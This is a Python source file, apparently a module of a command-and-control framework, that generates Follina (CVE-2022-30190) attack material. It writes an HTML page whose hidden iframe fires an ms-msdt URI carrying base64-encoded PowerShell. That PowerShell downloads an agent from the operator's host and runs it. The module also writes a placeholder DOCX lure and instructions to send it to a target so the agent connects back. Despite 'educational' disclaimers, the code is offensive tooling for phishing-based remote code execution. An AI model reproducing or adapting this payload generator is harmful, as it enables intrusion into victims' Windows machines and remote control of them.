import os

def generate_follina_agent_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    http = "https" if ssl else "http"
    follina_url = "/follina_url"
    
    # Create the HTML file that triggers the exploit
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Document</title>
    </head>
    <body>
        <script>
            // This is a simulated Follina (CVE-2022-30190) implementation
            // Create a new ActiveX object for the MS Diagnostic Tool
            function exploitFollina() {{
                try {{
                    // Follina exploit simulation
                    // Format: ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("'+'JGNsaWVudD1OZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50OyRjbGllbnQuRG93bmxvYWRTdHJpbmcoImh0dHA6Ly97aG9zdH06e3BvcnR9L3Jhd19hZ2VudCIpfHxpZXg='+'"))'))))i/../../tokeny"

                    // Create a hidden iframe to trigger the ms-msdt protocol
                    var msdt = document.createElement('iframe');
                    msdt.src = 'ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(Invoke-Expression($(Invoke-Expression(\'[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("JGNsaWVudD1OZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50OyRjbGllbnQuRG93bmxvYWRTdHJpbmcoImh0dHA6Ly97aG9zdH06e3BvcnR9L3Jhd19hZ2VudCIpfHxpZXg="))\'))))i/../../tokeny"';
                    msdt.style.visibility = 'hidden';
                    msdt.style.position = 'absolute';
                    msdt.style.width = '1px';
                    msdt.style.height = '1px';
                    document.body.appendChild(msdt);
                    
                    // Display a fake loading message
                    document.getElementById('status').innerHTML = 'Loading document...';
                }} catch (e) {{
                    console.error(e);
                }}
            }}
        </script>
        
        <h1>Document is loading...</h1>
        <p id="status">Please wait...</p>
        <button onclick="exploitFollina()">View Document</button>
        
        <p>This page demonstrates the Follina (CVE-2022-30190) vulnerability for educational purposes.</p>
        <p>It will attempt to load an agent from: {http}://{host}:{port}/raw_agent</p>
    </body>
    </html>
    """.replace("{host}", host).replace("{port}", str(port))
    
    html_file_path = os.path.join(agents_folder, "follina.html")
    with open(html_file_path, "w") as f:
        f.write(html_content)
    
    # Create a simple DOCX file that redirects to the HTML
    docx_content = f"""
    DOCX file that would exploit the Follina (CVE-2022-30190) vulnerability.
    
    In a real exploit, this document would contain:
    1. An embedded web reference to {http}://{host}:{port}{follina_url}
    2. The MS-MSDT protocol handler would be triggered when the document is opened
    3. PowerShell code would execute and download the agent from {http}://{host}:{port}/raw_agent
    
    This is a placeholder file for demonstration purposes.
    """
    
    docx_file_path = os.path.join(agents_folder, "Follinadoc.docx")
    with open(docx_file_path, "w") as f:
        f.write(docx_content)
    
    # Create instructions
    instructions = f"""
    Follina Agent (CVE-2022-30190) Instructions:
    
    1. Host the HTML file at: {http}://{host}:{port}{follina_url}
    2. Send the DOCX file to the target
    3. When opened, it will attempt to load content from the URL and execute the agent
    4. The agent will connect back to: {http}://{host}:{port}/raw_agent
    
    Note: This implementation simulates the Follina vulnerability for educational purposes.
    """
    
    instruction_file_path = os.path.join(agents_folder, "Follina_instructions.txt")
    with open(instruction_file_path, "w") as f:
        f.write(instructions)
    
    result = f"Follina agent generated:\n1. HTML file saved to: {html_file_path}\n2. DOCX file saved to: {docx_file_path}\n3. Instructions saved to: {instruction_file_path}\n\nAccess via {http}://{host}:{port}{follina_url}"
    return result